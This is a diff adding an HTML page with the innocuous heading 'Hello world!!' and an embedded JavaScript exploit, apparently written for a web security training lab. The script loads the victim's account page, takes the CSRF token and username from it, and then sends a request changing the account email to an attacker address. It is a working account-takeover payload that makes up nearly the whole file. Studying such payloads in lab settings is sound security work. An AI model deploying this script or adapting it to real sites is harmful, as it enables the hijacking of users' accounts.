@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Hello world!!</h1>
+
+
+    <script>
+        var req = new XMLHttpRequest();
+        var token = "";
+        var username = "";
+        req.onreadystatechange = function(){
+
+            if (req.readyState == 4)
+        {
+            var htmlResponse = req.responseText;
+            var parser = new DOMParser().parseFromString(htmlResponse,'text/html')
+            token = parser.getElementsByName("csrf")[0].value;
+            username  = parser.getElementsByTagName("a")[5].href.split("=")[1]; // wiener, username of victim user
+            console.log(username);
+            console.log(token);
+            console.log(htmlResponse)
+            exploit(token)
+        }
+        }
+
+        req.open('GET','/my-account',true)
+        req.send()
+        function exploit (token)
+            {
+
+        //var token = document.getElementsByName("csrf")[0].value;
+        var urlAttack = "/my-account/change-email";
+        var params = "csrf=" + token + "&email=attack3r@hacker.com";
+        var attackRequest = new XMLHttpRequest();
+        attackRequest.open("POST",urlAttack,true);
+        attackRequest.send(params);
+            }
+
+</script>
+</body>
+</html>
